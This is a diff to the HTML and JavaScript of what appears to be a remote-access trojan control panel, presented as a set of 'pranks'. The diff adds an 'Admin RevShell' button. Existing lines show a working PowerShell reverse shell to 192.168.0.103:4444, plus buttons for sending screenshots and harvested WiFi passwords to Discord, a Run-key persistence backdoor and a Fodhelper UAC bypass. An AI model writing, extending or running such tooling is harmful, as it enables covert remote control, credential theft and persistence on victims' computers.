@@ -218,6 +218,7 @@ footer{text-align:center;padding:8px;font-size:.7em;color:#2d3748}
 <button class="pbtn" onclick="if(confirm('Reverse Shell to 192.168.0.103:4444?'))runPrank('revshell')" style="border-color:rgba(255,0,0,.6);background:rgba(255,0,0,.1);color:#ff4444">&#128279; Rev Shell</button>
 <button class="pbtn" onclick="if(confirm('Screenshot to Discord?'))runPrank('screenshot')" style="border-color:rgba(183,148,244,.4);background:rgba(183,148,244,.08);color:#b794f4">&#128248; Screenshot</button>
 <button class="pbtn" onclick="if(confirm('RevShell+ to 192.168.0.103:4444?'))runPrank('revshell+')" style="border-color:rgba(255,0,0,.6);background:rgba(255,0,0,.1);color:#ff4444">&#128279; RevShell+</button>
+<button class="pbtn" onclick="if(confirm('SYSTEM LEVEL Reverse Shell to 192.168.0.103:4444?'))runPrank('adminrevshell')" style="border-color:rgba(229,62,62,.8);background:rgba(229,62,62,.2);color:#fc8181;font-weight:bold">&#128128; Admin RevShell</button>
 <button class="pbtn" onclick="if(confirm('Extract WiFi Passwords to Discord?'))runPrank('wifiharvest')" style="border-color:rgba(72,187,120,.4);background:rgba(72,187,120,.08);color:#48bb78">&#128246; WiFi Harvest</button>
 <button class="pbtn" onclick="if(confirm('Install Persistent Backdoor (Run Key)?'))runPrank('persistence')" style="border-color:rgba(246,173,85,.4);background:rgba(246,173,85,.08);color:#f6ad55">&#128376; Persistence</button>
 <button class="pbtn" onclick="if(confirm('Bypass UAC to System/Admin (Fodhelper)?'))runPrank('uacbypass')" style="border-color:rgba(72,187,120,.4);background:rgba(72,187,120,.08);color:#48bb78">&#128275; Bypass UAC</button>
@@ -514,6 +515,7 @@ const PRANKS={
   revshell:'RUNCMD:powershell -w h -c "$c=[Net.Sockets.TCPClient]::new(\'192.168.0.103\',4444);$s=$c.GetStream();$r=New-Object IO.StreamReader $s;$w=New-Object IO.StreamWriter $s;$w.AutoFlush=1;while($l=$r.ReadLine()){$w.Write((iex $l 2>&1|Out-String))}"',
   screenshot:'CMD:Screenshot',
   'revshell+':'CMD:RevShell+',
+  adminrevshell:'CMD:AdminRevShell',
   wifiharvest:'CMD:WiFiHarvest',
   persistence:'CMD:Persistence',
   uacbypass:'CMD:UACBypass',
